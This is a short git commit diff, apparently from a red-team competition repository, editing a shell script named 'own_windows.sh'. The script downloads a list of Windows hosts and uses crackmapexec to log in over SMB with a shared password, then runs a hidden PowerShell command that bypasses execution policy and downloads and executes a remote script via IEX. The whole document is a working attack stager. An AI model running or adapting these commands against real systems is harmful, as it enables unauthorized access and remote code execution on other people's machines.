83d5afc43acd280542acd343a6855ce382803c7c
stackviolator <joshmerrill255@gmail.com>
2024-03-01 21:47:20 -0500

    stager windows - done

--- red-scripts/own_windows.sh
+++ red-scripts/own_windows.sh
@@ -2,4 +2,4 @@
 
 curl -o windows.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt
 
-crackmapexec smb -U users.txt -p 'Change.me123!' -x "powershell -nop -w hidden -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/red-scripts/update.ps1')"&
+crackmapexec smb windows.txt -u users.txt -p 'Change.me123!' -x "powershell -nop -w hidden -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/red-scripts/update.ps1')"&
